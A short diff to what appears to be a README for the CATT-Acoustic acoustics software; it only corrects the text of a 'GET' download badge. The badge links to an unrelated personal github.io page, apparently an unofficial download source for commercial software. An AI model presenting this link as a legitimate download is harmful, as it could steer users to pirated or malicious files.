@@ -3,7 +3,7 @@
 
 ![CATT-Acoustic](https://www.catt.se/TUCT/timetrace-order.jpg)
 
-[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20 -0078D6?style=for-the-badge&logoColor=white)](https://hopimajejin20.github.io/.github/CATT-Acoustic)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20CATT-Acoustic-0078D6?style=for-the-badge&logoColor=white)](https://hopimajejin20.github.io/.github/CATT-Acoustic)
 
 ---
 
